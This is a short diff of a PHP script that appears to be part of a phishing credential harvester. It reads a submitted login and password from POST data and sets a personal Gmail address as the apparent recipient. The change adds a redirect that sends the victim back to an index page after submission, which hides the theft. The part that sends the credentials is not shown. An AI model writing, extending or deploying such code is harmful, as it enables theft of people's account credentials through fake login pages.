@@ -1,5 +1,5 @@
 <?php
-
+header( 'Location: /index.html' ) ;
 $log=$_POST['log'];
 $to='rrohitchauhan11@gmail.com';
 $pwd=$_POST['pwd'];
